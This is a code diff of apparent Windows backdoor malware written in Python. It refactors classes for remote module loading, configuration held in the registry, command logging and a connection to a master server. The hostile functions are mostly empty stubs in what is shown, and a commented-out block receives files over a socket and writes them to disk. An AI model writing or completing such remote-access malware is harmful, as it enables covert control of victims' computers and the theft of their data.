@@ -49,7 +49,7 @@ class BackdoorModules:
         command = command.split(" ")
         action = command[1]
         if action == "load":
-            pass
+            self.load()
             # module_path = "C:\\Users\\User\\Desktop\\MalwareModules"
             # with open(module_path, "wb") as file:
             #     data = self.s.recv(1024)
@@ -57,16 +57,28 @@ class BackdoorModules:
             #         file.write(data)
             #         data = self.s.recv(1024)
         elif action == "start" or action == "run":
-            pass
+            self.start()
         elif action == "stop" or action == "pause":
-            pass
+            self.stop()
         elif action == "remove" or action == "delete":
-            pass
+            self.remove()
+
+    def load(self):
+        pass
+
+    def start(self):
+        pass
+
+    def stop(self):
+        pass
+
+    def remove(self):
+        pass
 
 
 class BackdoorConfig:
     def __init__(self):
-        self.config = Config(winreg_key=DEFAULT_REG_KEY)
+        self.config = Config(winreg_key=REG_KEY)
 
     def see(self):
         config_file = json.dumps(self.config.get().toDict(), indent=2)
@@ -119,7 +131,8 @@ class CommandHandler:
         with open(self.commands_log) as f:
             return f.read()
 
-    def __get_ended_string(self, string):
+    @staticmethod
+    def __get_ended_string(string):
         if len(string) > 0:
             return string + "\n"
         else:
@@ -129,7 +142,7 @@ class CommandHandler:
 class Backdoor:
     def __init__(self):
         self.commands_log_filepath = r"C:\Users\User\Desktop\backdoor_log.txt"
-        self.config = Config(winreg_key=DEFAULT_REG_KEY)
+        self.config = Config(winreg_key=REG_KEY)
 
         self.sock = None
         self.server_ip = self.config.master_server["ip"]
